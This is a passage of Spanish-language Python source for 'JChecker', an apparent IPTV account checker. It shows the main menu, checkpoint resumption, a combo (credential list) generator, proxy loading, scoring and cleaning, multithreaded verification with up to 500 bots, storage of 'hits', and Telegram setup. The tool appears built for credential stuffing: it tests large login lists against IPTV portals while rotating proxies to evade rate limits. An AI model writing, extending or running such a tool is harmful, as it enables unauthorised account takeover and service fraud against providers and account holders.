            print(f"\n{Colors.CYAN}Modo: Empezar desde el principio{Colors.RESET}")
            print(f"{Colors.YELLOW}Se mantendrá la configuración pero se resetearán las estadísticas{Colors.RESET}")
        else:
            print(f"\n{Colors.CYAN}Modo: Continuar desde donde quedó{Colors.RESET}")
            print(f"{Colors.YELLOW}Se mantendrán todas las estadísticas y la posición{Colors.RESET}")

        time.sleep(1)

        checker = IPTVChecker()
        if checker.load_checkpoint(checkpoint_file, reset_stats=reset_stats):

            is_special = checker._check_special_domain(checker.portal)
            if is_special:
                print(f"\n{Colors.YELLOW}Detectado dominio especial: {checker.portal}{Colors.RESET}")
                print(f"{Colors.YELLOW}Se usarán headers específicos para este dominio.{Colors.RESET}")

            print(f"\n{Colors.GREEN}Checkpoint cargado correctamente. {'Reiniciando' if reset_stats else 'Reanudando'} verificación optimizada...{Colors.RESET}")
            time.sleep(1)
            checker.start()
        else:
            print(f"\n{Colors.RED}Error al cargar el checkpoint. Iniciando nueva verificación.{Colors.RESET}")
            time.sleep(2)

            checker = IPTVChecker()
            if checker.setup():
                is_special = checker._check_special_domain(checker.portal)
                if is_special:
                    print(f"\n{Colors.YELLOW}Detectado dominio especial: {checker.portal}{Colors.RESET}")
                    print(f"{Colors.YELLOW}Se usarán headers específicos para este dominio.{Colors.RESET}")

                print(f"\n{Colors.GREEN}Configuración completa. Iniciando verificación optimizada...{Colors.RESET}")
                time.sleep(1)
                checker.start()
    else:

        checker = IPTVChecker()
        if checker.setup():
            is_special = checker._check_special_domain(checker.portal)
            if is_special:
                print(f"\n{Colors.YELLOW}Detectado dominio especial: {checker.portal}{Colors.RESET}")
                print(f"{Colors.YELLOW}Se usarán headers específicos para este dominio.{Colors.RESET}")

            print(f"\n{Colors.GREEN}Configuración completa. Iniciando verificación optimizada...{Colors.RESET}")

            if proxy_manager.enabled:
                print(f"{Colors.CYAN}• Sistema de proxies inteligente activado con {len(proxy_manager.active_proxies)} proxies{Colors.RESET}")
                print(f"{Colors.CYAN}• Rotación automática y scoring de proxies habilitado{Colors.RESET}")

                proxy_manager.force_sync_display()

            print(f"{Colors.CYAN}• Verificación paralela con {checker.thread_count} threads{Colors.RESET}")
            print(f"{Colors.CYAN}• Rate limiting inteligente activado{Colors.RESET}")
            print(f"{Colors.CYAN}• Cache de respuestas optimizado{Colors.RESET}")

            time.sleep(2)
            checker.start()
        else:
            print(f"\n{Colors.RED}Error en la configuración. Volviendo al menú principal.{Colors.RESET}")
            time.sleep(2)

def generate_combo():
    """Ejecuta el generador de combos"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}GENERADOR DE COMBINACIONES{Colors.RESET}")
    combo_maker = ComboMaker()
    combo_file = combo_maker.generate_combo_menu()

    if combo_file:
        print(f"\n{Colors.GREEN}Combo generado exitosamente. ¿Desea verificarlo ahora con el sistema optimizado? (s/n): {Colors.RESET}")
        check_now = input().lower() == 's'

        if check_now:
            checker = IPTVChecker()
            checker.combo_file = combo_file

            if checker._load_combo() and checker._setup_credentials_processor() and checker._setup_portal():
                checker.get_categories = input(f"\n{Colors.YELLOW}¿Incluir la lista de categorías de canales? (s/n): {Colors.RESET}").lower() == 's'

                try:
                    thread_count = int(input(f"\n{Colors.YELLOW}Especifique el número de bots (1-500): {Colors.RESET}"))
                    checker.thread_count = max(1, min(500, thread_count))
                except:
                    checker.thread_count = 1

                use_proxies = input(f"\n{Colors.YELLOW}¿Quiere usar proxies? (s/n, RECOMENDADO): {Colors.RESET}").lower() == 's'
                if use_proxies:
                    proxy_file, proxy_type = proxy_manager.show_proxy_menu()
                    if proxy_file and proxy_type:
                        proxy_manager.load_proxies_from_file(proxy_file, proxy_type)

                print(f"\n{Colors.GREEN}Configuración completa. Iniciando verificación optimizada...{Colors.RESET}")
                time.sleep(1)
                checker.start()

    input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")

def verify_proxies():
    """Verifica y gestiona proxies con sistema ultra rápido"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}VERIFICADOR DE PROXIES - ULTRA RÁPIDO{Colors.RESET}")

    proxy_file, proxy_type = proxy_manager.show_proxy_menu()
    if proxy_file and proxy_type:
        print(f"\n{Colors.YELLOW}Iniciando verificación ultra rápida de proxies...{Colors.RESET}")
        if proxy_manager.load_proxies_from_file(proxy_file, proxy_type):
            print(f"\n{Colors.GREEN}Verificación de proxies completada con sistema optimizado.{Colors.RESET}")
            print(f"{Colors.CYAN}Información guardada en cache para futuras sesiones.{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}Error en la verificación de proxies.{Colors.RESET}")

    input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")

def analyze_server():
    """Ejecuta el analizador de servidores optimizado"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}ANALIZADOR DE SERVIDOR IPTV{Colors.RESET}")

    domain = input(f"\n{Colors.YELLOW}Ingrese el dominio a analizar: {Colors.RESET}")
    if domain:
        analyzer = ServerAnalyzer()
        analyzer.analyze(domain)

    input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")

def show_proxy_stats():
    """Muestra estadísticas detalladas de proxies"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}ESTADÍSTICAS DE PROXIES{Colors.RESET}")

    if not proxy_manager.enabled:
        print(f"\n{Colors.RED}No hay proxies cargados actualmente.{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}Información del sistema de proxies:{Colors.RESET}")
        print(f"{Colors.WHITE}Archivo de proxies: {Colors.YELLOW}{proxy_manager.proxy_file}{Colors.RESET}")
        print(f"{Colors.WHITE}Tipo de proxy: {Colors.YELLOW}{proxy_manager.proxy_type.upper()}{Colors.RESET}")

        total_proxies = len(proxy_manager.active_proxies)
        good_proxies = len(proxy_manager.good_proxies)
        bad_proxies = len(proxy_manager.bad_proxies)
        quarantine_proxies = len([p for p, until in proxy_manager.quarantine_proxies.items() 
                                if time.time() < until])

        print(f"\n{Colors.CYAN}Estadísticas generales:{Colors.RESET}")
        print(f"  {Colors.WHITE}Total de proxies activos: {Colors.GREEN}{total_proxies}{Colors.RESET}")
        print(f"  {Colors.WHITE}Proxies buenos: {Colors.GREEN}{good_proxies}{Colors.RESET}")
        print(f"  {Colors.WHITE}Proxies malos: {Colors.RED}{bad_proxies}{Colors.RESET}")
        print(f"  {Colors.WHITE}Proxies en cuarentena: {Colors.YELLOW}{quarantine_proxies}{Colors.RESET}")

        if proxy_manager.proxy_scores:
            print(f"\n{Colors.CYAN}Top 10 mejores proxies (por score):{Colors.RESET}")
            sorted_proxies = sorted(proxy_manager.proxy_scores.items(), 
                                    key=lambda x: x[1], reverse=True)[:10]

            for i, (proxy_str, score) in enumerate(sorted_proxies, 1):
                color = Colors.GREEN if score > 70 else Colors.YELLOW if score > 50 else Colors.RED
                print(f"  {Colors.WHITE}{i:2d}. {color}{proxy_str} - Score: {score:.1f}{Colors.RESET}")

        if os.path.exists(proxy_manager.cache_file):
            cache_time = os.path.getmtime(proxy_manager.cache_file)
            cache_age = time.time() - cache_time
            cache_age_str = f"{int(cache_age//3600)}h {int((cache_age%3600)//60)}m"
            print(f"\n{Colors.CYAN}Cache de proxies:{Colors.RESET}")
            print(f"  {Colors.WHITE}Última actualización: {Colors.YELLOW}{cache_age_str} ago{Colors.RESET}")
            print(f"  {Colors.WHITE}Proxies en histórico: {Colors.YELLOW}{len(proxy_manager.proxy_scores)}{Colors.RESET}")

    input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")

def show_config():
    """Muestra y gestiona la configuración"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}CONFIGURACIÓN{Colors.RESET}")

    print(f"\n{Colors.YELLOW}1. Configurar Telegram{Colors.RESET}")
    print(f"{Colors.YELLOW}2. Limpiar directorio de hits{Colors.RESET}")
    print(f"{Colors.YELLOW}3. Limpiar cache de proxies{Colors.RESET}")
    print(f"{Colors.YELLOW}4. Optimizar configuración del sistema{Colors.RESET}")
    print(f"{Colors.YELLOW}0. Volver al menú principal{Colors.RESET}")

    try:
        option = int(input(f"\n{Colors.GREEN}Elija una opción: {Colors.RESET}"))

        if option == 1:
            telegram_manager.setup()
        elif option == 2:
            confirm = input(f"\n{Colors.RED}¿Está seguro de que desea limpiar el directorio de hits? (s/n): {Colors.RESET}").lower()
            if confirm == 's':
                try:
                    hit_files = [f for f in os.listdir('hits') if f.endswith('.txt') or f.endswith('.json')]
                    for file in hit_files:
                        os.remove(os.path.join('hits', file))
                    print(f"\n{Colors.GREEN}Directorio de hits limpiado exitosamente.{Colors.RESET}")
                except Exception as e:
                    print(f"\n{Colors.RED}Error al limpiar directorio: {str(e)}{Colors.RESET}")
        elif option == 3:
            confirm = input(f"\n{Colors.RED}¿Está seguro de que desea limpiar el cache de proxies? (s/n): {Colors.RESET}").lower()
            if confirm == 's':
                try:
                    if os.path.exists(proxy_manager.cache_file):
                        os.remove(proxy_manager.cache_file)
                    print(f"\n{Colors.GREEN}Cache de proxies limpiado exitosamente.{Colors.RESET}")
                except Exception as e:
                    print(f"\n{Colors.RED}Error al limpiar cache: {str(e)}{Colors.RESET}")
        elif option == 4:
            print(f"\n{Colors.CYAN}Optimizaciones del sistema:{Colors.RESET}")
            print(f"{Colors.GREEN}• Sistema de proxies inteligente: ACTIVADO{Colors.RESET}")
            print(f"{Colors.GREEN}• Cache de respuestas HTTP: ACTIVADO{Colors.RESET}")
            print(f"{Colors.GREEN}• Verificación paralela ultra rápida: ACTIVADO{Colors.RESET}")
            print(f"{Colors.GREEN}• Rate limiting inteligente: ACTIVADO{Colors.RESET}")
            print(f"{Colors.GREEN}• Persistencia de datos de proxies: ACTIVADO{Colors.RESET}")
            print(f"\n{Colors.YELLOW}Todas las optimizaciones están activas y funcionando correctamente.{Colors.RESET}")
    except:
        pass

    input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")

def check_for_checkpoints():
    """Verifica si hay checkpoints disponibles para reanudar"""
    checkpoint_dir = 'checkpoints'

    if not os.path.exists(checkpoint_dir):
        return None

    checkpoint_files = sorted(
        [f for f in os.listdir(checkpoint_dir) if f.endswith('.json')],
        key=lambda x: os.path.getmtime(os.path.join(checkpoint_dir, x)),
        reverse=True  
    )

    if not checkpoint_files:
        return None

    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}VERIFICACIONES PENDIENTES (CHECKPOINTS){Colors.RESET}")
    print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    for i, file in enumerate(checkpoint_files):
        try:
            with open(os.path.join(checkpoint_dir, file), 'r') as f:
                data = json.load(f)

            portal = data.get('portal', 'Desconocido')
            combo = os.path.basename(data.get('combo_file', 'Desconocido'))

            position = data.get('position', 0)
            total = data.get('total_lines', data.get('stats', {}).get('total', 0))
            progress_pct = data.get('progress_percentage', 0)

            hits = data.get('stats', {}).get('hits', 0)
            fails = data.get('stats', {}).get('fails', 0)
            custom = data.get('stats', {}).get('custom', 0)

            timestamp = data.get('timestamp', 'Desconocido')
            threads = data.get('thread_count', 1)
            proxies = "Sí" if data.get('proxies_enabled', False) else "No"
            categories = "Sí" if data.get('get_categories', False) else "No"

            print(f"{Colors.YELLOW}{Colors.BOLD}[{i+1}] {Colors.RESET}{Colors.WHITE}{portal}{Colors.RESET}")
            print(f"    {Colors.CYAN}Combo:{Colors.RESET} {combo}")
            print(f"    {Colors.CYAN}Progreso:{Colors.RESET} {position}/{total} ({progress_pct}%)")
            print(f"    {Colors.CYAN}Resultados:{Colors.RESET} {Colors.GREEN}✓{hits}{Colors.RESET} | {Colors.RED}✗{fails}{Colors.RESET} | {Colors.YELLOW}⚠{custom}{Colors.RESET}")
            print(f"    {Colors.CYAN}Threads:{Colors.RESET} {threads} | {Colors.CYAN}Proxies:{Colors.RESET} {proxies} | {Colors.CYAN}Categorías:{Colors.RESET} {categories}")
            print(f"    {Colors.CYAN}Guardado:{Colors.RESET} {timestamp}")
            print()
        except Exception as e:
            print(f"{Colors.YELLOW}[{i+1}] {file}{Colors.RESET}")
            print(f"    {Colors.RED}Error al leer detalles: {e}{Colors.RESET}\n")

    print(f"{Colors.YELLOW}[0] Iniciar nueva verificación{Colors.RESET}\n")

    choice = input(f"{Colors.GREEN}Seleccione una opción para reanudar [0-{len(checkpoint_files)}]: {Colors.RESET}")

    try:
        choice = int(choice)
        if choice == 0:
            return None
        elif 1 <= choice <= len(checkpoint_files):
            selected_file = os.path.join(checkpoint_dir, checkpoint_files[choice-1])
            print(f"\n{Colors.GREEN}✓ Checkpoint seleccionado: {checkpoint_files[choice-1]}{Colors.RESET}")
            return selected_file
    except ValueError:
        print(f"{Colors.RED}Opción inválida. Iniciando nueva verificación.{Colors.RESET}")
        return None

    return None

def fix_windows_console():
    """Configuración rápida de consola para Windows"""
    if os.name == 'nt':
        try:

            os.system('chcp 65001 >nul 2>&1')

            os.environ['PYTHONIOENCODING'] = 'utf-8'

            import sys
            if hasattr(sys.stdout, 'reconfigure'):
                sys.stdout.reconfigure(encoding='utf-8', errors='replace')
                sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        except:
            pass  

def clean_proxy_file_by_port(filename):
    """Limpia un archivo de proxies removiendo puertos problemáticos"""
    if not os.path.exists(filename):
        print(f"{Colors.RED}Archivo no encontrado: {filename}{Colors.RESET}")
        return

    PROBLEMATIC_PORTS = [':4145', ':1080', ':9050', ':3128']

    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    original_count = len(lines)
    clean_lines = []
    filtered_count = 0

    for line in lines:
        line = line.strip()
        if line and any(bad_port in line for bad_port in PROBLEMATIC_PORTS):
            filtered_count += 1
            continue
        if line:
            clean_lines.append(line)

    clean_filename = filename.replace('.txt', '_cleaned.txt')
    with open(clean_filename, 'w', encoding='utf-8') as f:
        for line in clean_lines:
            f.write(f"{line}\n")

    print(f"{Colors.GREEN}Archivo limpiado guardado: {clean_filename}{Colors.RESET}")
    print(f"{Colors.YELLOW}Original: {original_count} proxies{Colors.RESET}")
    print(f"{Colors.RED}Filtrados: {filtered_count} proxies (puertos problemáticos){Colors.RESET}")
    print(f"{Colors.GREEN}Limpios: {len(clean_lines)} proxies{Colors.RESET}")

def clean_all_proxy_files():
    """Limpia todos los archivos de proxies en la carpeta Proxies/"""
    proxy_dir = 'Proxies'
    if not os.path.exists(proxy_dir):
        print(f"{Colors.RED}Directorio Proxies/ no encontrado{Colors.RESET}")
        return

    proxy_files = [f for f in os.listdir(proxy_dir) if f.endswith('.txt') and 'cleaned' not in f]

    if not proxy_files:
        print(f"{Colors.YELLOW}No se encontraron archivos de proxies para limpiar{Colors.RESET}")
        return

    print(f"{Colors.CYAN}Limpiando {len(proxy_files)} archivos de proxies...{Colors.RESET}")

    for proxy_file in proxy_files:
        file_path = os.path.join(proxy_dir, proxy_file)
        print(f"\n{Colors.CYAN}Limpiando: {proxy_file}{Colors.RESET}")
        clean_proxy_file_by_port(file_path)

def main():
    """Función principal optimizada y corregida"""
    global logger, telegram_manager, http_manager, geo_manager, proxy_manager, response_cache

    try:

        create_directories()

        fix_windows_console()

        device_type = detect_device_type()
        if device_type == 'pc':
            set_window_title("IPTV Checker by JC v5.7 - Cargando...")

        if not initialize_managers():
            print(f"{Colors.RED}Error inicializando el sistema. Saliendo...{Colors.RESET}")
            return
        logger = setup_logger(console_output=False)

        clear_screen()
        print_banner()

        device_info = "PC" if device_type == 'pc' else "Android"
        print(f"{Colors.GREEN}JChecker v5.7 - Sistema Iniciado en {device_info}{Colors.RESET}")
        print(f"{Colors.CYAN}• Todos los componentes cargados{Colors.RESET}")
        print(f"{Colors.CYAN}• Sistema listo para usar{Colors.RESET}")

        if device_type == 'pc':
            set_window_title("IPTV Checker by JC v5.7 - Menu Principal")

        time.sleep(2)

        while True:
            option = show_menu()

            if option == 0:

                try:
                    if 'proxy_manager' in globals() and proxy_manager.enabled:
                        proxy_manager._save_proxy_cache()
                except:
                    pass

                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Cerrando...")
                break

            elif option == 1:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Verificando Cuentas...")
                verify_accounts()
            elif option == 2:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Generador de Combos")
                generate_combo()
            elif option == 3:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Verificando Proxies...")
                verify_proxies()
            elif option == 4:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Analizando Servidor...")
                analyze_server()
            elif option == 5:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Configuración")
                show_config()
            elif option == 6:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Estadísticas Proxies")
                show_proxy_stats()

            elif option == 7:
                if device_type == 'pc':
                    set_window_title("IPTV Checker by JC v5.7 - Limpiando Proxies")
                clean_all_proxy_files()
                input(f"\n{Colors.CYAN}Presione ENTER para volver al menú principal.{Colors.RESET}")    

            else:
                print(f"\n{Colors.RED}Opción no válida. Intente de nuevo.{Colors.RESET}")
                time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Programa interrumpido por el usuario.{Colors.RESET}")

        try:
            if 'proxy_manager' in globals() and proxy_manager.enabled:
                proxy_manager._save_proxy_cache()
        except:
            pass
    except Exception as e:
        try:
            if logger:
                logger.error(f"Error en main(): {e}")
        except:
            pass
        print(f"\n{Colors.RED}Error inesperado: {str(e)}{Colors.RESET}")
        print(f"{Colors.YELLOW}Si el error persiste, verifique las dependencias.{Colors.RESET}")
    finally:
        device_type = detect_device_type()
        if device_type == 'pc':
            set_window_title("IPTV Checker by JC v5.7")
        print(f"\n{Colors.GREEN}¡Gracias por usar JChecker v5.7!{Colors.RESET}")
        show_cursor()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
    finally:

        import os
        os._exit(0)